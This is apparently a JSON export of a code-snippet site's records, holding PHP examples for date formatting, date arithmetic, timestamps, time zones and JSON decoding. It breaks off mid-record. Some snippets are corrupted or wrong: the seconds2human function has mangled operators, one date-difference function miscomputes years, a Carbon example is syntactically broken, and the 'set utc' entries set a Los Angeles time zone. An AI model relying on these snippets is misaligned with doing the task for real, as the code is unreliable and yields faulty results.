    "description": "<?php /* Variables can store data of different types, and different data types can do different things.  PHP supports the following data types:  1) String 2) Integer 3) Float (floating point numbers - also called double) 4) Boolean 5) Array 6) Object 7) NULL 8) Resource */    // PHP String $x = \"Hello world!\"; echo $x;  //PHP Integer $x = 5985; var_dump($x);  //PHP Float $x = 10.365; var_dump($x);  //PHP Boolean $x = true; $y = false;  //PHP Array $cars = array(\"Volvo\",\"BMW\",\"Toyota\"); var_dump($cars);  //PHP Object   class Car {       function Car() {           $this->model = \"VW\";       }   }    // create an object   $herbie = new Car();    // show object properties   echo $herbie->model;  //PHP NULL Value $x = \"Hello world!\"; $x = null; var_dump($x); ?>\n<?php $x = \"Hello world!\"; $y = 'Hello world!';  echo $x; echo \"<br>\"; echo $y; ?>\n",
    "reg_date": "2021-10-12T10:17:55.000Z"
  },
  {
    "id": 3396,
    "keyword": null,
    "link": null,
    "title": " php date + 30 days",
    "description": "$NewDate=Date('y:m:d', strtotime('+50 days'));\necho date('d/m/Y',strtotime('+30 days',strtotime(str_replace('/', '-', '05/06/2016')))) . PHP_EOL;\nthe time() +2592000\n",
    "reg_date": "2021-10-12T10:17:55.000Z"
  },
  {
    "id": 3397,
    "keyword": null,
    "link": null,
    "title": " php date + one day",
    "description": "<?php $stop_date = '2009-09-30 20:24:00'; echo 'date before day adding: ' . $stop_date;  $stop_date = date('Y-m-d H:i:s', strtotime($stop_date . ' +1 day')); echo 'date after adding 1 day: ' . $stop_date; ?>\n",
    "reg_date": "2021-10-12T10:17:55.000Z"
  },
  {
    "id": 3398,
    "keyword": null,
    "link": null,
    "title": " php date compare with today",
    "description": "$today = date(\"Y-m-d\"); $expire = $row->expireDate; //from database  $today_time = strtotime($today); $expire_time = strtotime($expire);  if ($expire_time < $today_time) { /* do Something */ }\n<?php  $datetime1 = new DateTime('2009-10-11 12:12:00'); $datetime2 = new DateTime('2009-10-13 10:12:00');  if ($datetime1 > $datetime2) {     echo 'datetime1 greater than datetime2'; }  if ($datetime1 < $datetime2) {     echo 'datetime1 lesser than datetime2'; }  if ($datetime1 == $datetime2) {     echo 'datetime2 is equal than datetime1'; }\nSelect if(Date('2020-10-01') > Date('2020-11-01'), '1', '2' ) as rslt_date\n$date1 = \"2021-01-15\"; $date2 = \"2021-01-18\";  if ($date1 < $date2) {  \techo \"$date1 is earlier than $date2\"; } else { \techo \"$date1 is later than $date2\"; }\n",
    "reg_date": "2021-10-12T10:17:55.000Z"
  },
  {
    "id": 3399,
    "keyword": null,
    "link": null,
    "title": " php date difference in days",
    "description": "<?php  // PHP program to add days to $Date     // Declare a date  $date = \"2019-05-10\";     // Add days to date and display it  echo date('Y-m-d', strtotime($date. ' + 10 days'));     ?> \n<?php $stop_date = '2009-09-30 20:24:00'; echo 'date before day adding: ' . $stop_date;  $stop_date = date('Y-m-d H:i:s', strtotime($stop_date . ' +1 day')); echo 'date after adding 1 day: ' . $stop_date; ?>\n//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$startDate = new DateTime(\"2019-10-27\"); $endDate = new DateTime(\"2020-04-11\");  $difference = $endDate->diff($startDate); echo $difference->format(\"%a\");\n<?php /**  * array _date_diff(string)  * function to get the difference between the date you enter and today, in days, months, or years.  * @param string $mydate  * @return array  */ function _date_diff($mydate) {     $now = time();     $mytime = strtotime(str_replace(\"/\", \"-\", $mydate)); // replace '/' with '-'; to fit with 'strtotime'     $diff = $now - $mytime;     $ret_diff = [         'days' => round($diff / (60 * 60 * 24)),         'months' => round($diff / (60 * 60 * 24 * 30)),         'years' => round($diff / (60 * 60 * 24 * 30 * 365))     ];     return $ret_diff; }  // example: var_dump(_date_diff('2021-09-11'));\n$now = time(); // or your date as well $your_date = strtotime(\"2010-01-31\"); $datediff = $now - $your_date;  echo round($datediff / (60 * 60 * 24));\n",
    "reg_date": "2021-10-12T10:17:55.000Z"
  },
  {
    "id": 3400,
    "keyword": null,
    "link": null,
    "title": " php date fomat",
    "description": "<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n $date=date_create(\"2013-03-15\");  echo date_format($date,\"Y/m/d H:i:s\"); \n",
    "reg_date": "2021-10-12T10:17:55.000Z"
  },
  {
    "id": 3401,
    "keyword": null,
    "link": null,
    "title": " php date format dd/mm/yyyy",
    "description": "date(\"d/m/Y\", strtotime($str));\n$date = DateTime::createFromFormat('d/m/Y', \"24/04/2012\"); echo $date->format('Y-m-d');\n$var = '20/04/2012'; $date = str_replace('/', '-', $var); echo date('Y-m-d', strtotime($date));\n",
    "reg_date": "2021-10-12T10:17:55.000Z"
  },
  {
    "id": 3402,
    "keyword": null,
    "link": null,
    "title": " php date format iso",
    "description": "echo date(DATE_ISO8601, strtotime('2010-12-30 23:21:46'));\n",
    "reg_date": "2021-10-12T10:17:55.000Z"
  },
  {
    "id": 3403,
    "keyword": null,
    "link": null,
    "title": " php date format minus 1 day",
    "description": "date('Y-m-d',(strtotime ( '-1 day' , strtotime ( $date) ) ));\n",
    "reg_date": "2021-10-12T10:17:56.000Z"
  },
  {
    "id": 3404,
    "keyword": null,
    "link": null,
    "title": " php date from mysql and date",
    "description": "$phpdate = strtotime( $mysqldate ); $mysqldate = date( 'Y-m-d H:i:s', $phpdate ); \n",
    "reg_date": "2021-10-12T10:17:56.000Z"
  },
  {
    "id": 3405,
    "keyword": null,
    "link": null,
    "title": " php date function get previous month",
    "description": "$lastDay = date('t',strtotime('last month'));  print_r($lastDay);\n$tgl = '25 january 2012';  $prevmonth = date(\"M Y\",mktime(0,0,0,date(\"m\", strtotime($tgl))-1,1,date(\"Y\", strtotime($tgl)))); echo $prevmonth;\n",
    "reg_date": "2021-10-12T10:17:56.000Z"
  },
  {
    "id": 3406,
    "keyword": null,
    "link": null,
    "title": " php date in human readable form",
    "description": "$timestamp = \"2013-09-30 01:16:06\"; echo date(\"F jS, Y\", strtotime($timestamp)); //September 30th, 2013\n",
    "reg_date": "2021-10-12T10:17:56.000Z"
  },
  {
    "id": 3407,
    "keyword": null,
    "link": null,
    "title": " php date is before",
    "description": "if( strtotime($database_date) > strtotime('now') ) { ...\n",
    "reg_date": "2021-10-12T10:17:56.000Z"
  },
  {
    "id": 3408,
    "keyword": null,
    "link": null,
    "title": " php date loop",
    "description": "$startTime = strtotime( '2010-05-01 12:00' ); $endTime = strtotime( '2010-05-10 12:00' );  // Loop between timestamps, 24 hours at a time for ( $i = $startTime; $i <= $endTime; $i = $i + 86400 ) {   $thisDate = date( 'Y-m-d', $i ); // 2010-05-01, 2010-05-02, etc } \n",
    "reg_date": "2021-10-12T10:17:56.000Z"
  },
  {
    "id": 3409,
    "keyword": null,
    "link": null,
    "title": " php date manual",
    "description": "<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n<?php echo date(\"F j, Y, g:i a\").\"<br>\";               // March 10, 2001, 5:16 pm echo date(\"m.d.y\").\"<br>\";                       // 03.10.01 echo date(\"j, n, Y\").\"<br>\";                     // 10, 3, 2001 echo date(\"Ymd\").\"<br>\";                         // 20010310 echo date('h-i-s, j-m-y, it is w Day').\"<br>\";   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 echo date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.').\"<br>\"; // it is the 10th day. echo date(\"D M j G:i:s T Y\").\"<br>\";             // Sat Mar 10 17:16:18 MST 2001 echo date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h').\"<br>\";   // 17:03:18 m is month echo date(\"H:i:s\").\"<br>\";                       // 17:16:18 echo date(\"Y-m-d H:i:s\").\"<br>\";                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n <?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone  $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>  \n$today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm\n",
    "reg_date": "2021-10-12T10:17:56.000Z"
  },
  {
    "id": 3410,
    "keyword": null,
    "link": null,
    "title": " php date month italian",
    "description": "$oldLocale = setlocale(LC_TIME, 'it_IT'); echo utf8_encode( strftime(\"%a %d %b %Y\", $row['eventtime']) ); setlocale(LC_TIME, $oldLocale);\n",
    "reg_date": "2021-10-12T10:17:56.000Z"
  },
  {
    "id": 3411,
    "keyword": null,
    "link": null,
    "title": " php date object to timestamp",
    "description": "<?php  echo date('m/d/Y H:i:s', 1541843467);  ?> \n$date = new DateTime(); echo $date->getTimestamp();\n$ts = 1171502725; $date = new DateTime(\"@$ts\");\n",
    "reg_date": "2021-10-12T10:17:56.000Z"
  },
  {
    "id": 3412,
    "keyword": null,
    "link": null,
    "title": " php date plus days",
    "description": "<?php  // PHP program to add days to $Date     // Declare a date  $date = \"2019-05-10\";     // Add days to date and display it  echo date('Y-m-d', strtotime($date. ' + 10 days'));     ?> \n<?php   // adding extra days to date       // Steps: \t// 1) using carbon     // 2) using strtotime            //Step 1   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      $new_date = Carbon::parse($date->addDays(1); // adds extra day                                // Step 2   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      echo $new_date = date('Y M d h:i:s', strtotime($date. '+1 day')); ?>\n$date = new DateTime('2020-11-24'); $date->add(new DateInterval(\"P9D\"));  echo $date->format('Y-m-d');\n",
    "reg_date": "2021-10-12T10:17:57.000Z"
  },
  {
    "id": 3413,
    "keyword": null,
    "link": null,
    "title": " php date reference",
    "description": "d - The day of the month (from 01 to 31) D - A textual representation of a day (three letters) j - The day of the month without leading zeros (1 to 31) l (lowercase 'L') - A full textual representation of a day N - The ISO-8601 numeric representation of a day (1 for Monday, 7 for Sunday) S - The English ordinal suffix for the day of the month (2 characters st, nd, rd or th. Works well with j) w - A numeric representation of the day (0 for Sunday, 6 for Saturday) z - The day of the year (from 0 through 365) W - The ISO-8601 week number of year (weeks starting on Monday) F - A full textual representation of a month (January through December) m - A numeric representation of a month (from 01 to 12) M - A short textual representation of a month (three letters) n - A numeric representation of a month, without leading zeros (1 to 12) t - The number of days in the given month L - Whether its a leap year (1 if it is a leap year, 0 otherwise) o - The ISO-8601 year number Y - A four digit representation of a year y - A two digit representation of a year a - Lowercase am or pm A - Uppercase AM or PM B - Swatch Internet time (000 to 999) g - 12-hour format of an hour (1 to 12) G - 24-hour format of an hour (0 to 23) h - 12-hour format of an hour (01 to 12) H - 24-hour format of an hour (00 to 23) i - Minutes with leading zeros (00 to 59) s - Seconds, with leading zeros (00 to 59) u - Microseconds (added in PHP 5.2.2) e - The timezone identifier (Examples: UTC, GMT, Atlantic/Azores) I (capital i) - Whether the date is in daylights savings time (1 if Daylight Savings Time, 0 otherwise) O - Difference to Greenwich time (GMT) in hours (Example: +0100) P - Difference to Greenwich time (GMT) in hours:minutes (added in PHP 5.1.3) T - Timezone abbreviations (Examples: EST, MDT) Z - Timezone offset in seconds. The offset for timezones west of UTC is negative (-43200 to 50400) c - The ISO-8601 date (e.g. 2013-05-05T16:34:42+00:00) r - The RFC 2822 formatted date (e.g. Fri, 12 Apr 2013 12:01:05 +0200) U - The seconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\ndate('w'); //gets day of week as number(0=sunday,1=monday...,6=sat)  //note:returns 0 through 6 but as string so to check if monday do this: if(date('w') == 1){ \techo \"its monday baby\"; }\n",
    "reg_date": "2021-10-12T10:17:57.000Z"
  },
  {
    "id": 3414,
    "keyword": null,
    "link": null,
    "title": " php date set utc",
    "description": " <?php date_default_timezone_set('America/Los_Angeles'); ?>  \n",
    "reg_date": "2021-10-12T10:17:57.000Z"
  },
  {
    "id": 3415,
    "keyword": null,
    "link": null,
    "title": " php date set utc hours",
    "description": " <?php date_default_timezone_set('America/Los_Angeles'); ?>  \n",
    "reg_date": "2021-10-12T10:17:57.000Z"
  },
  {
    "id": 3416,
    "keyword": null,
    "link": null,
    "title": " php date start of day",
    "description": "<?php  $query_date = '2010-02-04';  // First day of the month. echo date('Y-m-01', strtotime($query_date));  // Last day of the month. echo date('Y-m-t', strtotime($query_date));\n$startOfDay=date(\"Y-m-d 00:00:00\");\n",
    "reg_date": "2021-10-12T10:17:57.000Z"
  },
  {
    "id": 3417,
    "keyword": null,
    "link": null,
    "title": " php date strtotime add days",
    "description": "// add 1 day to the date above $n = date('Y-m-d', strtotime( $d . \" +1 days\"));  // add 1 month to the date above $n = date('Y-m-d', strtotime( $d . \" +1 month\"));  // add 1 year to the date above $n = date('Y-m-d', strtotime( $d . \" +1 year\"));  // subtract 1 day to the date above $n = date('Y-m-d', strtotime( $d . \" -1 days\"));  // subtract 1 month to the date above $n = date('Y-m-d', strtotime( $d . \" -1 month\"));  // subtract 1 year to the date above $n = date('Y-m-d', strtotime( $d . \" -1 year\"));\n$NewDate = date('Y-m-d', strtotime('+7 days'));\n",
    "reg_date": "2021-10-12T10:17:57.000Z"
  },
  {
    "id": 3418,
    "keyword": null,
    "link": null,
    "title": " php date strtotime format",
    "description": "$date = '25/05/2010'; $date = str_replace('/', '-', $date); echo date('Y-m-d', strtotime($date)); \n",
    "reg_date": "2021-10-12T10:17:57.000Z"
  },
  {
    "id": 3419,
    "keyword": null,
    "link": null,
    "title": " php date timestamp now",
    "description": "//Get current date time in PHP  // Simply: $date = date('Y-m-d H:i:s');  // Or: $date = date('Y/m/d H:i:s');  // This would return the date in the following formats respectively: $date = '2012-03-06 17:33:07'; // Or $date = '2012/03/06 17:33:07';  /**   * This time is based on the default server time zone.  * If you want the date in a different time zone,  * say if you come from Nairobi, Kenya like I do, you can set  * the time zone to Nairobi as shown below.  */  date_default_timezone_set('Africa/Nairobi');  // Then call the date functions $date = date('Y-m-d H:i:s'); // Or $date = date('Y/m/d H:i:s');  // date_default_timezone_set() function is however // supported by PHP version 5.1.0 or above. \ncheck here link:   http://www.eltcalendar.com/stuff/datemysqlphp.html\n",
    "reg_date": "2021-10-12T10:17:58.000Z"
  },
  {
    "id": 3420,
    "keyword": null,
    "link": null,
    "title": " php date to seconds",
    "description": "function seconds2human($ss) { $s = $ss`; $m = floor(($ss600)/60); $h = floor(($ss%86400)/3600); $d = floor(($ss%92000)/86400); $M = floor($ss/2592000);  return \"$M months, $d days, $h hours, $m minutes, $s seconds\"; }\n<?php $str = 'Tue Dec 15 2009'; $timestamp = strtotime($str); echo $timestamp; //output: 1260831600 ?>\n",
    "reg_date": "2021-10-12T10:17:58.000Z"
  },
  {
    "id": 3421,
    "keyword": null,
    "link": null,
    "title": " php date today plus 1 month",
    "description": "$future_timestamp = strtotime(\"+1 month\"); $data = date('Y-m-d', $future_timestamp);\n",
    "reg_date": "2021-10-12T10:17:58.000Z"
  },
  {
    "id": 3422,
    "keyword": null,
    "link": null,
    "title": " php datetime add 1 weeek",
    "description": "$date = new DateTime(); $date->modify('+1 day'); $date->modify('+5 week'); \n",
    "reg_date": "2021-10-12T10:17:58.000Z"
  },
  {
    "id": 3423,
    "keyword": null,
    "link": null,
    "title": " php datetime create",
    "description": "$date = DateTime::createFromFormat('d-m-Y', '15-12-2020');\n",
    "reg_date": "2021-10-12T10:17:58.000Z"
  },
  {
    "id": 3424,
    "keyword": null,
    "link": null,
    "title": " php datetime from timestamp",
    "description": "<?php  echo date('m/d/Y H:i:s', 1541843467);  ?> \n$time = '2021-03-31 23:59:00'; strtotime($time);\n$currentTime = DateTime::createFromFormat( 'U', $timestamp ); \n$date = new DateTime(); echo $date->getTimestamp();\n$ts = 1171502725; $date = new DateTime(\"@$ts\");\n",
    "reg_date": "2021-10-12T10:17:58.000Z"
  },
  {
    "id": 3425,
    "keyword": null,
    "link": null,
    "title": " php datetime object get unix timestamp",
    "description": "$date = new DateTime(); echo $date->getTimestamp();\n",
    "reg_date": "2021-10-12T10:17:58.000Z"
  },
  {
    "id": 3426,
    "keyword": null,
    "link": null,
    "title": " php datetime set timezone",
    "description": "echo date_default_timezone_get(); //UTC  //Read more at https://www.php.net/manual/en/function.date-default-timezone-get.php\ndate_default_timezone_set('America/Los_Angeles'); \n$date = new \\DateTime(); $date->setTimezone(new \\DateTimeZone('+0800')); //GMT echo $date->format('Y-m-d H:i:s'); // 2020-11-20 15:23:49\n",
    "reg_date": "2021-10-12T10:17:58.000Z"
  },
  {
    "id": 3427,
    "keyword": null,
    "link": null,
    "title": " php datetime sub minutes",
    "description": "$datetime = new DateTime();  //PT 'TIME' M //PT30S -> 30 Seconds //PT30M -> 30 Minutes //PT30H -> 30 Hours $datetime->sub(new DateInterval('PT12H30M')); \n",
    "reg_date": "2021-10-12T10:17:58.000Z"
  },
  {
    "id": 3428,
    "keyword": null,
    "link": null,
    "title": " php datetime to timestamp",
    "description": "<?php  echo date('m/d/Y H:i:s', 1541843467);  ?> \n$date = new DateTime(); echo $date->getTimestamp();\n$time = '2021-03-31 23:59:00'; strtotime($time);\n$date = new DateTime(); echo $date->getTimestamp();\n <?php $date = new DateTime(); echo $date->format('U = Y-m-d H:i:s') . \"\\n\";  $date->setTimestamp(1171502725); echo $date->format('U = Y-m-d H:i:s') . \"\\n\"; ?>  \n$ts = 1171502725; $date = new DateTime(\"@$ts\");\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3429,
    "keyword": null,
    "link": null,
    "title": " php days in month",
    "description": "// For given month echo cal_days_in_month(CAL_GREGORIAN, 1, 2021); // For current month echo date('t');\necho Date(\"Y-m-d\", strtotime(\"2013-01-01 +1 Month -1 Day\"));// 2013-01-31  echo Date(\"Y-m-d\", strtotime(\"2013-01-31 +1 Month -3 Day\")); // 2013-02-28  echo Date(\"Y-m-d\", strtotime(\"2013-01-31 +2 Month\")); // 2013-03-31  echo Date(\"Y-m-d\", strtotime(\"2013-01-31 +3 Month -1 Day\")); // 2013-04-30  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -1 Month -1 Day\")); // 2013-11-30  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -2 Month\")); // 2013-10-31  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -3 Month\")); // 2013-10-01  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -3 Month -1 Day\")); // 2013-09-30\n$DaysInCurrentMonth = date('t');\n// get day of month php // Method 1; some server not work, I had check php 7.3.24 not worked, php 7.3.8 worked cal_days_in_month(CAL_GREGORIAN, $month, $year) echo (cal_days_in_month(CAL_GREGORIAN, 2, 2020)); // => 29  // Method 2; function days_in_month($month, $year) {     // calculate number of days in a month     return $month == 2 ? ($year % 4 ? 28 : ($year % 100 ? 29 : ($year % 400 ? 28 : 29))) : (($month - 1) % 7 % 2 ? 30 : 31); }  // Method 3; echo (date('t', strtotime('2020-02-1')));\t// 29   \necho cal_days_in_month(CAL_GREGORIAN, 8, 2009); \n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3430,
    "keyword": null,
    "link": null,
    "title": " php declare(strict types=1)",
    "description": "\"Strict types\" mode only checks types at specific points in the code; it does not track everything that happens to the variable.  Specifically, it checks:  the parameters given to the function, if type hints are included in the signature; here you are giving two ints to a function expecting two ints, so there is no error the return value of the function, if a return type hint is included in the signature; here you have no type hint, but if you had a hint of : int, there would still be no error, because the result of $a + $b + $c is indeed an int. Here are some examples that do give errors:  declare(strict_types=1); $a = '1'; $b = '2'; function FunctionName(int $a, int $b) {     return $a + $b; } echo FunctionName($a, $b);\ndeclare(strict_types = 1);\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3431,
    "keyword": null,
    "link": null,
    "title": " php decode html special characters",
    "description": "$str = \"This is some &lt;b&gt;bold&lt;/b&gt; text.\"; echo htmlspecialchars_decode($str); // out will be like: // This is some <b>bold</b> text.\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3432,
    "keyword": null,
    "link": null,
    "title": " php decode json file",
    "description": "$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\n$json = json_decode(file_get_contents('/path/to/your/file.json'));\n<?php  $json = '{\"firstName\":\"Peter\",\"lastName:\":\"Silva\",\"age\":23}';  $personInfo = json_decode(json);  echo $personInfo->age;  ?>\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3433,
    "keyword": null,
    "link": null,
    "title": " php decode json object",
